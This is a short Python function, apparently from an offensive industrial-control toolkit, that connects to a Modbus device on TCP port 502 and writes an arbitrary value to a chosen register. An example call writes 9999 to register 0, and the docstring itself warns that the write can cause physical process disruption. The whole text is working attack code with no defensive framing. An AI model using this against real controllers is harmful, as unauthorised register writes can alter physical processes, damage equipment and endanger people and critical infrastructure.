def modbus_write_attack(target, unit_id, register, value):
    """
    Write arbitrary value to Modbus register (FC 06)
    WARNING: Can cause physical process disruption
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 502))

    trans_id = 1
    proto_id = 0
    length = 6
    func_code = 0x06

    request = struct.pack('>HHHBBHH', trans_id, proto_id, length, unit_id, func_code, register, value)

    sock.send(request)
    response = sock.recv(1024)

    if response[7] == 0x06:
        print(f"[+] Successfully wrote {value} to register {register}")
    else:
        print(f"[-] Write failed")

    sock.close()

# Example: modbus_write_attack('192.168.1.100', 1, 0, 9999)
